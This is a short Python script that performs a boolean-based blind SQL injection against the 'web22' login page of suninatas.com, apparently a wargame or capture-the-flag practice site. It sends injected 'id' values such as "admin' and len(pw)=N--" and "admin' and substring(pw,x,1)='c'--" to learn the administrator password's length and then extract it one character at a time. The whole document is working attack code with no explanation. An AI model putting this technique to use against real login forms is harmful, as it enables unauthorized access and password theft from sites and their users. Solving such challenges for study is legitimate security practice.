import requests

url = 'http://suninatas.com/Part_one/web22/web22.asp'
cookies = {
    'ASPSESSIONIDSAASSDQR': ''
}
payloads = {
    'id': '',
    'pw': ''
}

len_of_pw = 0
for i in range(100):
    sqli = 'admin\' and len(pw)=%d--' % i
    payloads['id'] = sqli
    payloads['pw'] = '1234'
    res = requests.get(url, cookies=cookies, params=payloads)
    res = res.text.split('\r\n')
    res = res[31].split('\t')
    res = res[5]
    print(res)
    if res.find('admin') > -1:
        len_of_pw = i
        break
        
print('The length of password is ', i)

pw = ''
for x in range(1, len_of_pw+1):
    for i in range(32, 127):
        sqli = 'admin\' and substring(pw,%d,1)=\'%s\'--' % (x, chr(i))
        payloads['id'] = sqli
        payloads['pw'] = '1234'
        res = requests.get(url, cookies=cookies, params=payloads)
        res = res.text.split('\r\n')
        res = res[31].split('\t')
        res = res[5]
        print(sqli, len(sqli), res)
        if res.find('admin') > -1:
            pw += chr(i)
            break
    print(pw)

print('The password is ', pw)
